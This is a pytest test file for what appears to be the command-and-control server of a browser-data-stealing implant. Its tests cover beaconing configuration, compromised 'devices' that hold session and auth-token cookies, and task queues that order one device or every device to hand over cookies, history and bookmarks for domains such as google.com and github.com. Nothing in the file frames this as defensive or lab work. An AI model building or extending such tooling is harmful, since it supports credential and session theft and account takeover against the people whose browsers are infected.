"""Tests for the CommandHandler (server-side state management)."""

import pytest
from datetime import datetime, timezone

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from command_handler import CommandHandler
from models import DeviceInfo


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def handler() -> CommandHandler:
    """Create a fresh CommandHandler for each test."""
    return CommandHandler()


# ---------------------------------------------------------------------------
# Initialisation
# ---------------------------------------------------------------------------

class TestInitialisation:
    """Tests for CommandHandler initialisation."""

    def test_has_default_config(self, handler: CommandHandler) -> None:
        assert handler.server_config.beacon_interval == 2
        assert handler.server_config.communication_protocol == "https"

    def test_seeds_sample_devices(self, handler: CommandHandler) -> None:
        assert len(handler.devices) == 3
        assert "device-alpha" in handler.devices
        assert "device-beta" in handler.devices
        assert "device-gamma" in handler.devices

    def test_sample_device_has_cookies(self, handler: CommandHandler) -> None:
        alpha = handler.devices["device-alpha"]
        assert "session_id" in alpha.cookies
        assert "auth_token" in alpha.cookies

    def test_gamma_is_offline(self, handler: CommandHandler) -> None:
        gamma = handler.devices["device-gamma"]
        assert gamma.status == "offline"


# ---------------------------------------------------------------------------
# Device registration
# ---------------------------------------------------------------------------

class TestDeviceRegistration:
    """Tests for register_device and get_device."""

    def test_register_new_device(self, handler: CommandHandler) -> None:
        device = DeviceInfo(name="new-dev", ip="10.0.0.1")
        handler.register_device(device)
        assert "new-dev" in handler.devices
        assert handler.devices["new-dev"].ip == "10.0.0.1"

    def test_register_updates_existing(self, handler: CommandHandler) -> None:
        device = DeviceInfo(name="device-alpha", ip="10.0.0.99")
        handler.register_device(device)
        assert handler.devices["device-alpha"].ip == "10.0.0.99"

    def test_register_updates_last_seen(self, handler: CommandHandler) -> None:
        before = datetime.now(timezone.utc)
        device = DeviceInfo(name="device-alpha", ip="10.0.0.1")
        handler.register_device(device)
        assert handler.devices["device-alpha"].last_seen >= before

    def test_get_device_returns_device(self, handler: CommandHandler) -> None:
        device = handler.get_device("device-alpha")
        assert device is not None
        assert device.name == "device-alpha"

    def test_get_device_returns_none_for_unknown(
        self, handler: CommandHandler
    ) -> None:
        assert handler.get_device("no-such-device") is None

    def test_register_device_with_cookies(
        self, handler: CommandHandler
    ) -> None:
        device = DeviceInfo(
            name="cookie-dev",
            ip="10.0.0.5",
            cookies={"session": "abc"},
        )
        handler.register_device(device)
        assert handler.devices["cookie-dev"].cookies == {"session": "abc"}


# ---------------------------------------------------------------------------
# Task queue management
# ---------------------------------------------------------------------------

class TestTaskQueue:
    """Tests for per-device task queue operations."""

    def test_queue_task_creates_task_for_device(
        self, handler: CommandHandler
    ) -> None:
        task = handler.queue_task("device-alpha", "request-cookies")
        assert task.task_type == "request-cookies"
        assert task.task_id  # non-empty UUID
        assert handler.pending_task_count("device-alpha") == 1

    def test_queue_task_with_parameters(
        self, handler: CommandHandler
    ) -> None:
        task = handler.queue_task(
            "device-alpha",
            "request-cookies",
            {"domains": "google.com,github.com"},
        )
        assert task.parameters == {"domains": "google.com,github.com"}

    def test_queue_multiple_tasks_for_same_device(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.queue_task("device-alpha", "request-history")
        handler.queue_task("device-alpha", "request-bookmarks")
        assert handler.pending_task_count("device-alpha") == 3

    def test_dequeue_returns_all_tasks(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.queue_task("device-alpha", "request-history")
        tasks = handler.dequeue_tasks("device-alpha")
        assert len(tasks) == 2
        assert tasks[0].task_type == "request-cookies"
        assert tasks[1].task_type == "request-history"

    def test_dequeue_removes_tasks(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.dequeue_tasks("device-alpha")
        assert handler.pending_task_count("device-alpha") == 0

    def test_dequeue_empty_returns_empty_list(
        self, handler: CommandHandler
    ) -> None:
        tasks = handler.dequeue_tasks("device-alpha")
        assert tasks == []

    def test_dequeue_unknown_device_returns_empty_list(
        self, handler: CommandHandler
    ) -> None:
        tasks = handler.dequeue_tasks("no-such-device")
        assert tasks == []

    def test_queue_task_for_all_devices(
        self, handler: CommandHandler
    ) -> None:
        tasks = handler.queue_task_for_all("request-cookies")
        assert len(tasks) == 3  # 3 seeded devices
        for name in ["device-alpha", "device-beta", "device-gamma"]:
            assert handler.pending_task_count(name) == 1

    def test_queue_task_for_all_with_parameters(
        self, handler: CommandHandler
    ) -> None:
        tasks = handler.queue_task_for_all(
            "request-cookies", {"domains": "google.com"}
        )
        for task in tasks:
            assert task.parameters == {"domains": "google.com"}

    def test_all_pending_tasks_summary(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.queue_task("device-alpha", "request-history")
        handler.queue_task("device-beta", "request-bookmarks")
        pending = handler.all_pending_tasks()
        assert pending["device-alpha"] == 2
        assert pending["device-beta"] == 1
        assert "device-gamma" not in pending

    def test_all_pending_tasks_empty(
        self, handler: CommandHandler
    ) -> None:
        pending = handler.all_pending_tasks()
        assert pending == {}

    def test_tasks_are_per_device_isolated(
        self, handler: CommandHandler
    ) -> None:
        handler.queue_task("device-alpha", "request-cookies")
        handler.queue_task("device-beta", "request-history")
        # Dequeue only alpha
        handler.dequeue_tasks("device-alpha")
        assert handler.pending_task_count("device-alpha") == 0
        assert handler.pending_task_count("device-beta") == 1

